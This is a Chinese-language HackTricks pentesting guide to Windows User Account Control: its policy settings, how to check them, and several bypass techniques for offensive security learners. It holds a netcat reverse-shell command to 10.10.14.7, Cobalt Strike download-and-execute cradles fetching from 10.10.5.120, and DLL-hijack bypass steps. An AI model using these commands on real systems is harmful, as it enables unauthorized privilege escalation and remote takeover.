# UAC - 用户账户控制

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进的**社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[用户账户控制（UAC）](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/how-user-account-control-works)是一种功能，它为**提升的活动提供了同意提示**。应用程序具有不同的`完整性`级别，具有**高级别**的程序可以执行**可能危及系统的任务**。当启用UAC时，应用程序和任务始终在**非管理员帐户的安全上下文中运行**，除非管理员明确授权这些应用程序/任务以管理员级别访问系统来运行。它是一种方便功能，可保护管理员免受意外更改，但不被视为安全边界。

有关完整性级别的更多信息：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

当UAC启用时，管理员用户会获得两个令牌：一个标准用户密钥，用于以常规级别执行常规操作，以及一个具有管理员特权的令牌。

这个[页面](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/how-user-account-control-works)详细讨论了UAC的工作原理，包括登录过程、用户体验和UAC架构。管理员可以使用安全策略在本地级别（使用secpol.msc）配置UAC的工作方式，或者通过组策略对象（GPO）在Active Directory域环境中进行配置和推送。这些各种设置在[这里](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)详细讨论。有10个组策略设置可以用于UAC。下表提供了额外的详细信息：

| 组策略设置                                                                                                                                                                                                                                                                                                                                                                 | 注册表键                     | 默认设置                                                    |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [内置管理员帐户的用户账户控制：管理员批准模式](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 禁用                                                         |
| [用户账户控制：允许UIAccess应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 禁用                                                         |
| [用户账户控制：管理员批准模式下管理员的提升提示行为](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 对非Windows二进制文件提示同意                           |
| [用户账户控制：标准用户的提升提示行为](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 在安全桌面上提示凭据                                     |
| [用户账户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 启用（家庭版默认）禁用（企业版默认）                       |
| [用户账户控制：仅提升已签名和验证的可执行文件](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 禁用                                                         |
| [用户账户控制：仅提升已安装在安全位置的UIAccess应用程序](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 启用                                                         |
| [用户账户控制：以管理员批准模式运行所有管理员](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 启用                                                         |
| [用户账户控制：在提示提升时切换到安全桌面](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 启用                                                         |
| [用户账户控制：将文件和注册表写入失败虚拟化到每个用户位置](https://docs.microsoft.com/zh-cn/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations) | EnableVirtualization | 已启用 |

### UAC绕过理论

如果用户属于管理员组，则某些程序会自动进行**自动提升**。这些二进制文件在其**清单**中具有值为**True**的**autoElevate**选项。该二进制文件还必须由**Microsoft签名**。

然后，为了**绕过**UAC（从**中等**完整性级别**提升到高级**），一些攻击者使用此类二进制文件来**执行任意代码**，因为它将从**高级**完整性进程中执行。

您可以使用Sysinternals的工具**sigcheck.exe**检查二进制文件的**清单**。您还可以使用_Process Explorer_或_Process Monitor_（Sysinternals的工具）查看进程的**完整性级别**。

### 检查UAC

要确认UAC是否已启用，请执行以下操作：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果值为**`1`**，则表示UAC已**激活**；如果值为**`0`**或者**不存在**，则表示UAC处于**未激活**状态。

接下来，检查已配置的**UAC级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* 如果值为**`0`**，则UAC不会提示（类似于**禁用**）
* 如果值为**`1`**，管理员需要输入用户名和密码以使用高权限执行二进制文件（在安全桌面上）
* 如果值为**`2`**（始终通知我），当管理员尝试以高权限执行某些操作时，UAC将始终要求确认（在安全桌面上）
* 如果值为**`3`**，类似于`1`，但在安全桌面上不是必需的
* 如果值为**`4`**，类似于`2`，但在安全桌面上不是必需的
* 如果值为**`5`**（默认值），它将要求管理员确认以使用高权限运行非Windows二进制文件

然后，您需要查看**`LocalAccountTokenFilterPolicy`**的值\
如果值为**`0`**，则只有**RID 500**用户（内置管理员）能够执行**管理员任务而无需UAC**，如果值为`1`，则**"Administrators"**组中的所有帐户都可以执行这些任务。

最后，查看键**`FilterAdministratorToken`**的值\
如果值为**`0`**（默认值），则**内置管理员帐户可以**执行远程管理任务，如果值为**`1`**，则内置管理员帐户**无法**执行远程管理任务，除非`LocalAccountTokenFilterPolicy`设置为`1`。

#### 总结

* 如果`EnableLUA=0`或**不存在**，则**任何人都没有UAC**
* 如果`EnableLua=1`且**`LocalAccountTokenFilterPolicy=1`，则任何人都没有UAC**
* 如果`EnableLua=1`且**`LocalAccountTokenFilterPolicy=0`且`FilterAdministratorToken=0`，则RID 500（内置管理员）没有UAC**
* 如果`EnableLua=1`且**`LocalAccountTokenFilterPolicy=0`且`FilterAdministratorToken=1`，则所有人都有UAC**

可以使用**metasploit**模块`post/windows/gather/win_privs`收集所有这些信息。

您还可以检查用户的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC绕过

{% hint style="info" %}
请注意，如果您可以以图形方式访问受害者的计算机，UAC绕过就很简单，因为当UAC提示出现时，您只需点击“是”即可。
{% endhint %}

在以下情况下需要UAC绕过：**UAC已激活，您的进程在中等完整性上下文中运行，并且您的用户属于管理员组**。

需要注意的是，**如果UAC处于最高安全级别（始终），绕过UAC要困难得多，而如果UAC处于其他任何级别（默认），则绕过UAC要容易得多**。

### 禁用UAC

如果UAC已经禁用（`ConsentPromptBehaviorAdmin`为**`0`**），您可以使用以下命令**以管理员权限（高完整性级别）执行反向Shell**：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 使用令牌复制绕过UAC

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### 非常基本的UAC“绕过”（完全访问文件系统）

如果你拥有一个属于管理员组的用户的shell，你可以通过SMB（文件系统）本地挂载C$共享，然后你将可以访问文件系统中的所有内容（甚至是管理员的主文件夹）。

{% hint style="warning" %}
**看起来这个技巧不再起作用了**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用Cobalt Strike绕过UAC

只有在UAC未设置为最高安全级别时，Cobalt Strike技术才能生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
### KRBUACBypass

文档和工具在[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC绕过漏洞

[**UACME**](https://github.com/hfiref0x/UACME)是几个UAC绕过漏洞的**编译**集合。请注意，您需要使用Visual Studio或MSBuild编译UACME。编译将创建多个可执行文件（例如`Source\Akagi\outout\x64\Debug\Akagi.exe`），您需要知道**您需要哪一个**。\
您应该**小心**，因为某些绕过方法会**提示其他程序**，这些程序会**警告**用户有事情发生。

UACME具有每个技术开始工作的**构建版本**。您可以搜索影响您版本的技术。
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
此外，使用[此页面](https://en.wikipedia.org/wiki/Windows\_10\_version\_history)，您可以从构建版本中获取Windows版本`1607`。

#### 更多UAC绕过

这里使用的所有绕过AUC的技术都需要与受害者进行全交互式shell（常见的nc.exe shell是不够的）。

您可以使用meterpreter会话。迁移到一个具有Session值等于1的进程：

![](<../../.gitbook/assets/image (96).png>)

（explorer.exe应该可以工作）

### 使用GUI绕过UAC

如果您可以访问GUI，当您收到UAC提示时，您可以直接接受它，您不需要绕过它。因此，访问GUI将允许您绕过UAC。

此外，如果您获得了某人正在使用的GUI会话（可能通过RDP），则有一些工具将以管理员身份运行，您可以直接运行cmd等作为管理员，而无需再次由UAC提示，例如[https://github.com/oski02/UAC-GUI-Bypass-appverif](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能更加隐蔽。

### 喧闹的暴力破解UAC绕过

如果您不在意喧闹，您可以始终运行类似于[https://github.com/Chainski/ForceAdmin](https://github.com/Chainski/ForceAdmin)的东西，它会要求提升权限，直到用户接受为止。

### 您自己的绕过方法-基本的UAC绕过方法

如果您查看UACME，您会注意到大多数UAC绕过都滥用了Dll劫持漏洞（主要是将恶意dll写入_C:\Windows\System32_）。[阅读此内容以了解如何查找Dll劫持漏洞](../windows-local-privilege-escalation/dll-hijacking.md)。

1. 找到一个将自动提升权限的二进制文件（检查执行时是否以高完整性级别运行）。
2. 使用procmon查找可能容易受到DLL劫持的“NAME NOT FOUND”事件。
3. 您可能需要将DLL写入一些受保护的路径（如C:\Windows\System32），您没有写入权限。您可以使用以下方法绕过此限制：
1. wusa.exe：适用于Windows 7、8和8.1。它允许在受保护的路径中提取CAB文件的内容（因为此工具是以高完整性级别执行的）。
2. IFileOperation：适用于Windows 10。
4. 准备一个脚本，将您的DLL复制到受保护的路径中，并执行易受攻击且自动提升权限的二进制文件。

### 另一种UAC绕过技术

这种方法是观察是否有一个自动提升权限的二进制文件尝试从注册表中读取要执行的二进制文件或命令的名称/路径（如果二进制文件在HKCU中搜索此信息，则更有趣）。

![](<../../.gitbook/assets/image (9) (1) (2).png>)

使用[Trickest](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的公司广告吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
